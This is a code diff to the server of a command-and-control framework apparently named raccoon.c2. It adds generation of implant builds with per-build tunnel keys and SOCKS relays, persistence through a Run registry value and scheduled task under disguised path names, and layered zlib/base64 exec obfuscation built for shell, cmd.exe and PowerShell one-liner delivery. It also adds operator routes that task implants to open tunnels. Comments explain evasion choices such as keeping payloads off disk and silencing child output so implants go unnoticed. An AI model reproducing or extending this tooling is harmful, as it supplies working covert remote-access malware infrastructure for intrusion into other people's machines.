@@ -45,13 +45,19 @@ from flask import Flask, request, jsonify, send_file, send_from_directory, Respo
 # keeping them out of it is the reason listeners are separate processes at
 # all.
 from software.c2.listeners.errors import SupervisorError
+
+# The second artifact shape. The templates live beside the startup hook
+# in `stagers/` rather than here, because nothing in that package may
+# import this one: `tools/build_interpreter_bundle.py` is its other
+# consumer and has no business loading a web application.
+from software.c2.stagers.stager import drop_list, render_stager
 from werkzeug.serving import generate_adhoc_ssl_context, make_server
 
 try:
-    from software.c2.beacon import decode_key
+    from software.c2.beacon import decode_key, persistence_name
 except ImportError:
     # The container ships server.py and beacon.py side by side, not as a package.
-    from beacon import decode_key
+    from beacon import decode_key, persistence_name
 
 logger = logging.getLogger("raccoon.c2.server")
 server_log = logging.getLogger("raccoon.c2.events")
@@ -239,6 +245,328 @@ def _load_state(data_dir: Path):
 
 # ── Beacon generator helpers ──
 
+# How many random bytes a build's tunnel identity is made of.
+#
+# Random, and deliberately not `_assign_name`'s word list and counter.
+# That counter is saved only on the result and scan paths, so a team
+# server restarted after registering agents that never reported rewinds it
+# and hands out a name a previous host had. The tunnel identity is the key
+# of the SOCKS port table, and a port pinned to a name that rewound points
+# at a different network than the operator believes.
+_TUNNEL_IDENTITY_BYTES = 6
+
+
+def _tunnel_keystore_path(data_dir) -> Path:
+    """The one path the generator and the tunnel server share.
+
+    One file with two readers: the generator registers each build's PSK
+    in it, and the tunnel server reads its candidate PSKs out of it.
+    `KeyStore` is built for exactly that -- it re-reads the file whenever
+    it is asked, so a build registered here is accepted by a tunnel
+    server that is already running, and retiring one takes effect without
+    a restart.
+
+    The path itself is spelled once, in `tunnel/keys.py`, and both this
+    and `TunnelSupervisor.key_store_path` ask that module for it. They
+    used to build it separately while each claiming to be the shared one.
+    Imported inside the function for the reason every other reach into
+    `software.c2.tunnel` from this module is: a deployment that generates
+    no tunnel ships `server.py` and `beacon.py` with no tunnel package
+    beside them.
+    """
+    from software.c2.tunnel.keys import keystore_path
+
+    return keystore_path(data_dir)
+
+
+def _tunnel_config_for_build(body: dict, data_dir) -> Optional[dict]:
+    """The `tunnel` block for one generated build, or None for no tunnel.
+
+    One identity and one PSK per build, minted here and registered with
+    the tunnel server's `KeyStore` before the build goes out. Per build
+    because under `Noise_NKpsk0` the implant presents no static key, so
+    possession of the PSK plus the server's public key *is* the whole
+    credential: one PSK shared across every build would mean a single
+    captured implant lets anyone complete the handshake and claim any
+    identity. Per build also makes retiring a burned build a deletion of
+    its PSK rather than a rotation of everything.
+
+    The public key is read back out of the same store rather than taken
+    from the request, so a build cannot be issued with a key this
+    deployment will not present.
+
+    Returns None when the request asks for no tunnel, and raises
+    `ValueError` naming the field when it asks for one that cannot be
+    built. Nothing is registered in either case: a store littered with
+    PSKs no build holds is a candidate list every handshake has to walk.
+    """
+    # Imported here, not at the top: the container ships server.py and
+    # beacon.py side by side with no `tunnel` package beside them, and a
+    # deployment that generates no tunnel should not need one. `PSK_LEN`
+    # and `_DEFAULT_KEEPALIVE` are read rather than repeated -- the store
+    # refuses a PSK of the wrong length, and the endpoint's own default is
+    # what a build with no explicit interval should get.
+    from software.c2.beacon import _DEFAULT_KEEPALIVE, tunnel_config_problem
+    from software.c2.tunnel.keys import PSK_LEN, KeyStore
+
+    asked = body.get("tunnel") or {}
+    if not isinstance(asked, dict):
+        raise ValueError("tunnel must be an object, not %s"
+                         % type(asked).__name__)
+    if not asked.get("enabled"):
+        return None
+
+    for field in ("psk", "identity", "public_key"):
+        if asked.get(field):
+            raise ValueError(
+                "tunnel.%s cannot be supplied in the request: the PSK and "
+                "the identity are minted here, one per build, and the "
+                "public key is this deployment's own. A build carrying any "
+                "of them from elsewhere is one the tunnel server has not "
+                "registered." % field)
+
+    server = str(asked.get("server") or "").strip()
+    if not server:
+        raise ValueError(
+            "tunnel.server is required: it is the host the endpoint dials "
+            "out to, written as the target's network can reach it")
+    if any(char.isspace() for char in server) or "/" in server:
+        # A bare host or IP, because that is what it is used as: it goes
+        # to `socket.create_connection` and into a `CONNECT <server>:<port>`
+        # line. A pasted `https://c2.example.com`, a trailing fragment of
+        # a path or an embedded space therefore ships a build that can
+        # never connect -- and the endpoint's explanation of why goes to
+        # `DEVNULL`, so the refusal has to happen here. Checked beside
+        # `port`, which has had a range check all along.
+        raise ValueError(
+            "tunnel.server must be a bare hostname or IP address, not %r: "
+            "it is dialled directly and written into a CONNECT line, so a "
+            "URL, a path or a stray space is a build that cannot connect "
+            "and cannot say why" % (server,))
+    port = asked.get("port")
+    try:
+        port = 0 if isinstance(port, bool) else int(port)
+    except (TypeError, ValueError):
+        port = 0
+    if not 1 <= port <= 65535:
+        raise ValueError(
+            "tunnel.port must be a port between 1 and 65535: it is the "
+            "single port that serves the command channel and every relay")
+
+    # A store that cannot be opened or written is this deployment's
+    # problem and not the request's, so it is raised as something the
+    # routes answer 500 to. A 400 would tell the operator their request
+    # was wrong while the file named in the message says otherwise.
+    path = _tunnel_keystore_path(data_dir)
+    identity = "tun-" + os.urandom(_TUNNEL_IDENTITY_BYTES).hex()
+    psk = os.urandom(PSK_LEN)
+    try:
+        store = KeyStore(path)
+        store.register_build(identity, psk)
+        public_key = base64.b64encode(store.static_public()).decode("ascii")
+    except (ValueError, OSError) as exc:
+        raise RuntimeError(
+            "the tunnel key store at %s could not be used, so no build can "
+            "be registered: %s" % (path, exc))
+
+    keepalive = asked.get("keepalive_seconds")
+    block = {
+        "enabled": True,
+        "server": server,
+        "port": port,
+        "public_key": public_key,
+        "psk": base64.b64encode(psk).decode("ascii"),
+        "identity": identity,
+        "keepalive_seconds": (keepalive if keepalive is not None
+                              else _DEFAULT_KEEPALIVE),
+        "allow_slow_crypto": bool(asked.get("allow_slow_crypto")),
+    }
+
+    # The same predicate the endpoint applies, asked here so that a build
+    # the endpoint would refuse is never delivered. If it fires, the
+    # credential that was just registered is taken back out again.
+    problem = tunnel_config_problem({"c2": {"tunnel": block}})
+    if problem:
+        store.retire_build(identity)
+        raise ValueError(problem)
+    return block
+
+
+# The words a build's layout names are drawn from: a directory under the
+# user's own tree and a payload file inside it. Lower case and ordinary,
+# because they sit in a path somebody may one day read.
+_PERSIST_PATH_WORDS = ("cache", "runtime", "support", "profile", "session",
+                       "shared", "config", "state")
+
+
+def _persistence_config_for_build(body: dict) -> dict:
+    """The `persistence` block for one generated build: three names and a gate.
+
+    Minted here, one set per build, and never taken from the request. A
+    name is only worth generating if it is different in every deployment,
+    and the thing that used to be wrong is that there was one of them
+    everywhere: a single burned engagement burned the `Run` value and the
+    scheduled task for every deployment that followed.
+
+    `name` is the autorun entry -- the HKCU `Run` value and the scheduled
+    task both carry it, and `Beacon._exec_unpersist` removes exactly it.
+    `base_dir` and `payload_name` are the brought-interpreter layout the
+    stager writes and the bundle builder fills in; a build that never
+    brings an interpreter carries them unused, which costs nothing and
+    means the stager has no second place to look.
+
+    Only `gate` is read from the request, because it is the one choice an
+    engagement can reasonably make for itself. Anything other than the
+    two gates that exist becomes `path`; see `render_sitecustomize` in
+    `software/c2/stagers/startup_hook.py` for why that is the default.
+    """
+    asked = body.get("persistence") or {}
+    if not isinstance(asked, dict):
+        asked = {}
+    gate = asked.get("gate")
+    if gate not in ("path", "argc"):
+        gate = "path"
+
+    return {
+        "name": persistence_name(os.urandom(4)),
+        "base_dir": "%s%s" % (secrets.choice(_PERSIST_PATH_WORDS),
+                              secrets.token_hex(2)),
+        "payload_name": "%s%s.py" % (secrets.choice(_PERSIST_PATH_WORDS),
+                                     secrets.token_hex(2)),
+        "gate": gate,
+    }
+
+
+def _beacon_gen_config(body: dict, protocols: dict, c2_url: str,
+                       data_dir) -> dict:
+    """The `gen_cfg` baked into one generated build.
+
+    Written once and called from both generator routes. The two used to
+    hold identical copies of this dictionary, and a key added to one of
+    them is the defect this repository keeps paying for --
+    `_beacon_config_block` and `_obfuscate_layer` were both hoisted out of
+    those same two routes for the same reason. The tunnel block is one
+    more fact that has to reach both.
+    """
+    https_cfg = protocols.get("https", {})
+    dns_cfg = protocols.get("dns", {})
+    smb_cfg = protocols.get("smb", {})
+    quic_cfg = protocols.get("quic", {})
+
+    return {
+        "https": {"enabled": bool(https_cfg.get("enabled")),
+                  "callback_url": https_cfg.get("callback_url", c2_url),
+                  "verify_ssl": False},
+        "dns": {"enabled": bool(dns_cfg.get("enabled")),
+                "domain": dns_cfg.get("domain", ""),
+                "resolver": dns_cfg.get("resolver", "8.8.8.8")},
+        "smb": {"enabled": bool(smb_cfg.get("enabled")),
+                "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
+                "server": smb_cfg.get("server", "")},
+        "quic": {"enabled": bool(quic_cfg.get("enabled")),
+                 "server": quic_cfg.get("server", "")},
+        "proxy": _proxy_config_from_body(body),
+        "c2_profile": _active_c2_profile or {},
+        # None when no tunnel was asked for. The bootstrap tests this key
+        # for truth, so a build without one is a plain beacon.
+        "tunnel": _tunnel_config_for_build(body, data_dir),
+        # Always present: every build installs persistence under its own
+        # generated name, whether or not it brings an interpreter.
+        "persistence": _persistence_config_for_build(body),
+    }
+
+
+def _stagers_for_build(gen_cfg: dict, drops, oneliner_unix: str,
+                       oneliner_win: str) -> dict:
+    """`{"stager_nix", "stager_win"}` for one generated build.
+
+    Written once and called from both generator routes, for the reason
+    `_beacon_gen_config` above it was: a key added to one of those two
+    routes and not the other is the defect this repository keeps paying
+    for.
+
+    The one-liner each stager carries is that platform's ordinary
+    delivery, unchanged -- a host that already has a usable interpreter
+    gets exactly what an operator would have pasted. `base_dir` is the
+    build's own generated layout name, so the stager and the artifact
+    that lands in it cannot disagree about where it is.
+    """
+    base_dir = (gen_cfg.get("persistence") or {}).get("base_dir") or ""
+    return {
+        "stager_nix": render_stager("posix", oneliner=oneliner_unix,
+                                    drops=drops, base_dir=base_dir),
+        "stager_win": render_stager("windows", oneliner=oneliner_win,
+                                    drops=drops, base_dir=base_dir),
+    }
+
+
+def _layout_for_response(gen_cfg: dict) -> dict:
+    """The build's layout, as the bundle builder's arguments want it.
+
+    `tools/build_interpreter_bundle.py` requires `--base-dir` and takes
+    `--payload-name` and `--gate`, and all three are minted per build by
+    `_persistence_config_for_build`. Without them in the response an
+    operator cannot build a bundle for the artifact they just generated:
+    `docs/TUNNEL.md` told them to pass "the build's base_dir" and left
+    them decoding the config blob out of a `deob` preview truncated to
+    2000 characters.
+
+    A mismatch is not loud, which is why this is worth a field rather
+    than a paragraph. The startup hook runs whatever payload name the
+    bundle was built with, so the payload still starts; it is
+    `_bundled_payload` under the `argc` gate that then points at a file
+    which is not there, and the build silently falls back to the `path`
+    gate -- reversing the telemetry choice the operator made.
+
+    None of the three is a secret. All three are inside the artifact and
+    inside the rendered stager already; the PSK is the thing that never
+    comes back out of this process, and it is not here.
+    """
+    block = gen_cfg.get("persistence") or {}
+    return {
+        "base_dir": block.get("base_dir") or "",
+        "payload_name": block.get("payload_name") or "",
+        "gate": block.get("gate") or "",
+    }
+
+
+def _log_generated_tunnel(gen_cfg: dict, event: str) -> str:
+    """Record which build was issued a tunnel; return its identity, or "".
+
+    The identity and nothing else. It is what an operator needs to find
+    the build's SOCKS port and to retire it later, and the PSK is what
+    they must never be handed back -- a credential in an event log or a
+    JSON response is a credential in a screenshot.
+    """
+    tunnel = gen_cfg.get("tunnel") or {}
+    identity = tunnel.get("identity") or ""
+    if identity:
+        _log_event(event, "Tunnel endpoint baked in: identity %s dialling "
+                          "%s:%d" % (identity, tunnel["server"],
+                                     tunnel["port"]))
+    return identity
+
+
+def _retire_generated_tunnel(gen_cfg: dict, data_dir) -> None:
+    """Undo a registration for a build that was never delivered.
+
+    The gist route registers the credential before `gh` has uploaded
+    anything, and an upload that fails leaves a PSK in the store that no
+    artifact holds. Every candidate in that file is tried on every
+    incoming handshake, so litter there is not free.
+    """
+    from software.c2.tunnel.keys import KeyStore
+
+    identity = (gen_cfg.get("tunnel") or {}).get("identity")
+    if not identity:
+        return
+    try:
+        KeyStore(_tunnel_keystore_path(data_dir)).retire_build(identity)
+    except (ValueError, OSError) as exc:
+        logger.warning("tunnel: could not retire undelivered build %s: %s",
+                       identity, exc)
+
+
 def _proxy_config_from_body(body: dict) -> dict:
     """Build the beacon's proxy config block from a generator request."""
     proxy = body.get("proxy") or {}
@@ -262,6 +590,54 @@ def _proxy_config_from_body(body: dict) -> dict:
     }
 
 
+def _obfuscate_layer(code: str, var_mod: str) -> str:
+    """One zlib + base64 layer around `code`, keeping what it decompressed.
+
+    Written once and called from both generator routes. It used to be a
+    closure defined separately inside each of them, and the day the two
+    had to change together is the day this repository would have paid for
+    the duplication again -- `_beacon_config_block` already had to be
+    hoisted out of them for the same reason.
+
+    The emitted line binds the decompressed text to the module global
+    `_src` before executing it, instead of handing it straight to `exec`.
+    That is what lets a running artifact start a second mode of itself:
+    under `python3 -c` there is no file to re-run and `sys.argv[0]` is the
+    literal string "-c", so the only copy of the source is the one the
+    process is holding. `Beacon._exec_tunnel` writes it to a
+    `python3 -` child on stdin, which keeps the payload off the child's
+    command line and off the disk.
+
+    `globals()['_src']` rather than a plain assignment: the artifact is
+    normally exec'd at module level, where the two are the same, but an
+    embedder that execs it from inside a function would bind a local and
+    throw the source away without a word. The read in `exec(_src)` is an
+    ordinary global load, which works either way.
+
+    **Every string literal here is single-quoted, and that is a delivery
+    requirement rather than a style.** The one-liners that carry this
+    text wrap it in double quotes, so a double quote inside would close
+    them: `CommandLineToArgvW` and PowerShell's argument-mode parser both
+    concatenate the segments and strip the quotes, which handed `-c` an
+    unquoted `globals()[_src]=...` and a `NameError`. With single quotes
+    inside and double quotes outside, and with no `$`, backtick,
+    backslash or `"` anywhere in the emitted text -- base64's alphabet has
+    none of them and neither does the alias -- one text survives `sh -c`,
+    `cmd.exe` and `Invoke-Expression` alike.
+
+    With several layers each one binds `_src` in turn and the innermost
+    wins, because the innermost is the only one whose decompressed text is
+    the real source rather than the next wrapper.
+    """
+    import zlib
+
+    compressed = zlib.compress(code.encode("utf-8"), 9)
+    encoded = base64.b64encode(compressed).decode()
+    return ("import base64 as %s,zlib;"
+            "globals()['_src']=zlib.decompress(%s.b64decode('%s'));"
+            "exec(_src)" % (var_mod, var_mod, encoded))
+
+
 def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
                          enc_key: str) -> str:
     """Render the __main__ bootstrap appended to a generated beacon.
@@ -269,6 +645,23 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
     The config travels as a base64 JSON blob rather than inline literals:
     credentials such as "CORP\\user" contain backslashes and profiles contain
     JSON booleans, both of which corrupt a quoted-literal embedding.
+
+    Two names are read out of the beacon source this block is appended to
+    rather than repeated here -- `_TUNNEL_MODE_ENV` and
+    `tunnel_mode_problem` -- plus `TunnelEndpoint` and `Beacon`
+    themselves. The environment variable and the rule for what counts as
+    a runnable tunnel block are both facts the parent and the child have
+    to agree on exactly, and the two are the same file, so neither is
+    written twice. `tunnel_mode_problem` is also what makes a block with
+    `enabled: false` refused here: a dict is truthy whatever is in it, so
+    the lift below says only that a block was baked in, not that it can
+    be run.
+
+    `persistence` is lifted with `.get` and a default rather than read
+    straight out of the blob, because this block is also rendered from
+    `gen_cfg` dictionaries built by hand -- a tolerant lift keeps a
+    bootstrap that ran yesterday running, and an empty block is what
+    `Beacon` already treats as "no block, derive a name".
     """
     import textwrap
 
@@ -276,19 +669,155 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
         json.dumps(gen_cfg).encode("utf-8")).decode("ascii")
     return textwrap.dedent(f"""\
     if __name__=="__main__":
-        import base64 as _b64,json as _j
+        import base64 as _b64,json as _j,os as _os
         _p=_j.loads(_b64.b64decode("{cfg_b64}").decode("utf-8"))
         _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
         "https":_p["https"],"dns":_p["dns"],"smb":_p["smb"],"quic":_p["quic"],
         "encryption_key":"{enc_key}",
         "proxy":_p["proxy"],
+        "persistence":_p.get("persistence") or {{}},
         "c2_profile":_p["c2_profile"]}}}}
-        b=Beacon(_cfg);b.start()
-        try:
-            import time
-            while True: time.sleep(60)
-        except KeyboardInterrupt: b.stop()
+        _t=_p.get("tunnel")
+        if _t: _cfg["c2"]["tunnel"]=_t
+        if _os.environ.get(_TUNNEL_MODE_ENV):
+            _problem=tunnel_mode_problem(_cfg)
+            if _problem: raise SystemExit(
+                _TUNNEL_MODE_ENV+" is set, so this process is the tunnel "
+                "child, but "+_problem)
+            TunnelEndpoint(_cfg).run()
+        else:
+            b=Beacon(_cfg);b.start()
+            try:
+                import time
+                while True: time.sleep(60)
+            except KeyboardInterrupt: b.stop()
     """)
+
+
+# ── Tunnel panel helpers ──
+#
+# The process that runs the tunnel server has no fleet table. It reports
+# each endpoint's `_implant_id` and leaves `agent` at None, because the
+# mapping from that to a fleet row is this module's knowledge and
+# `software/c2/tunnel/` may not import this module -- it would pull flask,
+# werkzeug, jinja2 and click into the process that holds every build's
+# PSK. So the link, the check-in interval, the pending state and the
+# endpoint child's own refusal are added here, on the way to the panel.
+
+
+def _agent_for_implant(implant_id) -> Optional[str]:
+    """The fleet's name for the host an endpoint reported, or None.
+
+    None is a supported answer, not a failure: an endpoint started from a
+    systemd unit has no beacon above it and so no fleet row, and its
+    tunnel is shown unlinked rather than hidden.
+    """
+    if not implant_id:
+        return None
+    for name, info in agents.items():
+        if info.get("id") == implant_id:
+            return name
+    return None
+
+
+def _tunnel_expected(agent_name: str):
+    """When that agent is next due: `(interval, seconds, "HH:MM")`.
+
+    The interval the agent reported and the last time it was heard from.
+    An agent already overdue gets `0` seconds rather than a negative
+    number: this estimate exists for an operator deciding whether to
+    wait, and "it was due four minutes ago" is what the row's own
+    last-seen says.
+    """
+    info = agents.get(agent_name) or {}
+    interval = _as_int(info.get("interval"), 300)
+    due = info.get("_last_seen_ts", 0) + interval
+    seconds = max(0, int(round(due - time.time())))
+    return (interval, seconds,
+            time.strftime("%H:%M", time.localtime(time.time() + seconds)))
+
+
+def _tunnel_pending(agent_name: str) -> Optional[dict]:
+    """That agent's `tunnel` task which it has not confirmed yet, or None.
+
+    Read from the history rather than the queue, because a task leaves
+    `task_queues` the moment it is handed over and its history entry
+    stays `pending` until the result comes back. The queue alone would
+    stop showing pending at the instant the agent was told and before it
+    had done anything -- which is the gap this whole display exists to
+    close.
+
+    Only the most recent `tunnel` task counts: an older one has been
+    answered, and the row is about what is happening now.
+    """
+    for entry in reversed(history.get(agent_name) or []):
+        if entry.get("cmd") != "tunnel":
+            continue
+        return entry if entry.get("status") == "pending" else None
+    return None
+
+
+def _tunnel_refusal(agent_name: str) -> str:
+    """The last thing that agent's `tunnel` verb refused, or "".
+
+    The endpoint child's stdout and stderr are both `DEVNULL`, and
+    deliberately so -- a child that writes to the terminal it was started
+    from is how an implant gets noticed -- so the throughput gate's
+    refusal and the config pre-flight's reach nobody. The `tunnel` verb
+    returns them as its task output, and this is where they become
+    something an operator can read instead of `exit_code: 1`.
+    """
+    for entry in reversed(history.get(agent_name) or []):
+        if entry.get("cmd") != "tunnel":
+            continue
+        output = entry.get("output")
+        if isinstance(output, str) and output.startswith("[error]"):
+            return output
+        return ""
+    return ""
+
+
+def _tunnel_row(row: dict) -> dict:
+    """One endpoint row as the panel needs it.
+
+    An endpoint is **not** the tunnel server, and this is where the
+    difference is written down: its start and stop are a task for an
+    agent, so the row carries whether one is outstanding and when the
+    agent is next expected, and the panel shows that latency rather than
+    hiding it behind a button that appears to have worked.
+    """
+    out = dict(row)
+    agent = _agent_for_implant(row.get("implant_id"))
+    out["agent"] = agent
+    out["linked"] = agent is not None
+    out["interval"] = None
+    out["pending"] = False
+    out["pending_action"] = None
+    out["expected"] = None
+    out["expected_seconds"] = None
+    out["refusal"] = ""
+    out["detail"] = ""
+    if agent is None:
+        out["detail"] = ("no fleet agent reported this host, so this "
+                         "endpoint cannot be started or stopped from here; "
+                         "it was started from a unit and is managed there")
+        return out
+
+    interval, seconds, expected = _tunnel_expected(agent)
+    out["interval"] = interval
+    out["refusal"] = _tunnel_refusal(agent)
+    task = _tunnel_pending(agent)
+    if task is not None:
+        action = (task.get("args") or "").strip() or "start"
+        out["pending"] = True
+        out["pending_action"] = action
+        out["expected"] = expected
+        out["expected_seconds"] = seconds
+        out["detail"] = (
+            "tunnel %s is queued for %s and takes effect at its next "
+            "check-in, expected about %s (it checks in every %ds)"
+            % (action, agent, expected, interval))
+    return out
 
 
 # ── Flask app ──
@@ -308,7 +837,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                server_config: Optional[dict] = None,
                operator_port: Optional[int] = None,
                listener_token: Optional[str] = None,
-               supervisor=None) -> Flask:
+               supervisor=None, tunnel_supervisor=None) -> Flask:
     app = Flask(__name__)
     static_dir = Path(__file__).parent / "static"
     _server_config = server_config or {}
@@ -698,6 +1227,199 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             logger.info("Listener %s refused for %r: %s", action, name,
                         reason)
             return jsonify({"error": reason}), status
+
+    # ── The tunnel (the 🔌 panel) ──
+    #
+    # Two objects, deliberately not one. The tunnel **server** is a
+    # supervised process: start and stop are immediate and drop every
+    # endpoint at once. An **endpoint** is an agent's tunnel: start and
+    # stop are a task for that agent and take effect at its next check-in,
+    # so the answer says pending and when to expect it. A control that
+    # silently takes five minutes is the cousin of one that silently does
+    # nothing, and the only defence is to display the latency.
+
+    _TUNNEL_UNCONFIGURED = (
+        "no tunnel server is configured. Add a c2.tunnel_server block to "
+        "raccoon.yaml and restart the team server; it ships disabled, "
+        "because switching it on opens a listening socket.")
+
+    @app.route("/api/server/tunnel", methods=["GET"])
+    @require_auth
+    def api_tunnel():
+        """The tunnel server's state, and one row per endpoint.
+
+        Operator socket only. The agent socket serves the beacon endpoint
+        and the DNS tasking route and nothing else, so a beacon that
+        asked for this gets the cover answer -- which matters more here
+        than for most routes, because these can start and stop processes.
+        """
+        if tunnel_supervisor is None:
+            return jsonify({
+                "server": {"state": "unconfigured", "can_control": False,
+                           "detail": _TUNNEL_UNCONFIGURED, "pid": None,
+                           "endpoints": [], "sessions": []},
+                "endpoints": [],
+                "managed": False,
+                "detail": _TUNNEL_UNCONFIGURED,
+            })
+        state = tunnel_supervisor.status()
+        rows = [_tunnel_row(row) for row in state.pop("endpoints", None) or []]
+        return jsonify({
+            "server": state,
+            "endpoints": rows,
+            "managed": bool(state.get("can_control")),
+            "detail": "" if state.get("can_control")
+                      else state.get("detail", ""),
+        })
+
+    @app.route("/api/server/tunnel/<action>", methods=["POST"])
+    @require_auth
+    def api_tunnel_action(action):
+        """Start or stop the tunnel server process, and nothing else.
+
+        Two verbs, matched exactly. Anything else is a 404 rather than
+        something that reaches the supervisor: this route is how a panel
+        button turns into a process, and the set of things it can do
+        should be readable in one line.
+        """
+        if action not in ("start", "stop"):
+            return jsonify({"error": "the only actions are start and stop",
+                            "refused": str(action)[:64]}), 404
+        if tunnel_supervisor is None:
+            return jsonify({"error": _TUNNEL_UNCONFIGURED}), 409
+        # Counted before the process is signalled, because afterwards
+        # there is nothing left to count -- and the number is what makes
+        # the sentence below true for this deployment rather than a
+        # general warning.
+        dropped = 0
+        if action == "stop":
+            dropped = len(tunnel_supervisor.status().get("endpoints") or [])
+        try:
+            state = (tunnel_supervisor.start() if action == "start"
+                     else tunnel_supervisor.stop())
+        except SupervisorError as exc:
+            reason = str(exc)
+            # No 404 arm here, unlike the listeners': this route names no
+            # object, so there is no name to have typed wrong. Every
+            # refusal is about the state.
+            logger.info("Tunnel server %s refused: %s", action, reason)
+            return jsonify({"error": reason}), 409
+        rows = [_tunnel_row(row) for row in state.pop("endpoints", None) or []]
+        if action == "stop":
+            detail = (
+                "the tunnel server is stopped. That dropped every endpoint "
+                "at once: %d %s connected. Each one needs `tunnel start` "
+                "tasked to its agent again, which takes effect at that "
+                "agent's next check-in."
+                % (dropped, "was" if dropped == 1 else "were"))
+        else:
+            detail = (
+                "the tunnel server is running. Endpoints are not started "
+                "from here: each one dials in by itself once its agent has "
+                "been tasked `tunnel start`.")
+        logged = "server %s" % action
+        if action == "stop":
+            # Only where it happened: "start (0 endpoints dropped)" reads
+            # like a bug in the line that reports it.
+            logged += " (%d endpoint%s dropped)" % (
+                dropped, "" if dropped == 1 else "s")
+        _log_event("TUNNEL", logged)
+        return jsonify({
+            "server": state,
+            "endpoints": rows,
+            # Immediate, and said in the same word the endpoint route
+            # uses for the opposite case, so a panel can branch on it.
+            "pending": False,
+            "dropped": dropped,
+            "detail": detail,
+        })
+
+    @app.route("/api/server/tunnel/endpoint/<identity>/<action>",
+               methods=["POST"])
+    @require_auth
+    def api_tunnel_endpoint_action(identity, action):
+        """Queue `tunnel start` or `tunnel stop` for one endpoint's agent.
+
+        Nothing here touches the tunnel server process. An endpoint is
+        the implant's side of a tunnel, so the only way to start or stop
+        one is to task the agent that runs it -- which happens at its next
+        check-in, up to a whole interval away. The answer says so, with
+        the expected time, and so does the row.
+
+        404 when the identity is unknown and 409 when it is fine and the
+        state is not, which is the split `api_listener_action` makes: a
+        panel can then tell "you typed it wrong" from "it is not running".
+        """
+        if action not in ("start", "stop"):
+            return jsonify({"error": "the only actions are start and stop",
+                            "refused": str(action)[:64]}), 404
+        if tunnel_supervisor is None:
+            return jsonify({"error": _TUNNEL_UNCONFIGURED}), 409
+        state = tunnel_supervisor.status()
+        if state.get("state") != "running":
+            return jsonify({"error":
+                            "the tunnel server is not running (%s), so it "
+                            "has no endpoints to start or stop"
+                            % (state.get("detail")
+                               or state.get("state"))}), 409
+        rows = {row.get("identity"): row
+                for row in state.get("endpoints") or []}
+        row = rows.get(identity)
+        if row is None:
+            known = ", ".join(sorted(name for name in rows if name))
+            return jsonify({"error":
+                            "no endpoint called %r is connected to this "
+                            "tunnel server; have %s"
+                            % (identity, known or "none")}), 404
+        agent = _agent_for_implant(row.get("implant_id"))
+        if agent is None:
+            return jsonify({"error":
+                            "endpoint %r is not linked to a fleet agent, so "
+                            "there is nothing to task. It was started "
+                            "without a beacon above it -- from a systemd "
+                            "unit -- and has to be started and stopped "
+                            "there." % identity}), 409
+
+        task = {
+            "id": str(uuid.uuid4())[:8],
+            "cmd": "tunnel",
+            "args": action,
+            "data": "",
+            "timeout": 300,
+            "lane": "operator",
+            "queued": _now(),
+            "status": "pending",
+        }
+        task_queues.setdefault(agent, []).append(task)
+        history.setdefault(agent, []).append({
+            "task_id": task["id"],
+            "cmd": task["cmd"],
+            "args": task["args"],
+            "lane": task["lane"],
+            "timestamp": task["queued"],
+            "status": "pending",
+            "output": None,
+        })
+        interval, seconds, expected = _tunnel_expected(agent)
+        _log_event("TUNNEL", "endpoint %s: tunnel %s queued for %s "
+                   "(task_id=%s, expected ~%s)"
+                   % (identity, action, agent, task["id"], expected),
+                   agent_id=agent)
+        return jsonify({
+            "identity": identity,
+            "agent": agent,
+            "action": action,
+            "task_id": task["id"],
+            "pending": True,
+            "interval": interval,
+            "expected": expected,
+            "expected_seconds": seconds,
+            "detail": ("tunnel %s is queued for %s. It takes effect at the "
+                       "next check-in, expected about %s -- %s checks in "
+                       "every %ds -- and the row stays pending until the "
+                       "agent confirms."
+                       % (action, agent, expected, agent, interval)),
+        })
 
     @app.route("/api/server/exec", methods=["POST"])
     @require_auth
@@ -1106,7 +1828,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     @app.route("/api/server/beacon-gen", methods=["POST"])
     @require_auth
     def api_beacon_gen():
-        import zlib, random as _r, string
+        import random as _r, string
         body = request.get_json(silent=True) or {}
         c2_url = body.get("c2_url", "").strip()
         enc_key = body.get("enc_key", "").strip()
@@ -1121,31 +1843,26 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if not enc_key:
             enc_key = base64.b64encode(crypto._key).decode()
 
-        https_cfg = protocols.get("https", {})
-        dns_cfg = protocols.get("dns", {})
-        smb_cfg = protocols.get("smb", {})
-        quic_cfg = protocols.get("quic", {})
-
         beacon_path = Path(__file__).parent / "beacon.py"
         if not beacon_path.exists():
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
-        gen_cfg = {
-            "https": {"enabled": bool(https_cfg.get("enabled")),
-                      "callback_url": https_cfg.get("callback_url", c2_url),
-                      "verify_ssl": False},
-            "dns": {"enabled": bool(dns_cfg.get("enabled")),
-                    "domain": dns_cfg.get("domain", ""),
-                    "resolver": dns_cfg.get("resolver", "8.8.8.8")},
-            "smb": {"enabled": bool(smb_cfg.get("enabled")),
-                    "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
-                    "server": smb_cfg.get("server", "")},
-            "quic": {"enabled": bool(quic_cfg.get("enabled")),
-                     "server": quic_cfg.get("server", "")},
-            "proxy": _proxy_config_from_body(body),
-            "c2_profile": _active_c2_profile or {},
-        }
+        # Before anything is registered. A drop list that could not be
+        # verified on the target is a refusal, and a refusal raised after
+        # `_beacon_gen_config` has minted a PSK would leave a credential
+        # in the store that no artifact holds.
+        try:
+            drops = drop_list(body.get("drops"))
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
+
+        try:
+            gen_cfg = _beacon_gen_config(body, protocols, c2_url, data_dir)
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
+        except RuntimeError as exc:
+            return jsonify({"error": str(exc)}), 500
         config_block = _beacon_config_block(gen_cfg, interval, jitter, enc_key)
 
         payload = src + "\n" + config_block
@@ -1153,18 +1870,11 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         def _rand_name(n=12):
             return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))
 
-        def _obfuscate_layer(code, layer_num):
-            compressed = zlib.compress(code.encode("utf-8"), 9)
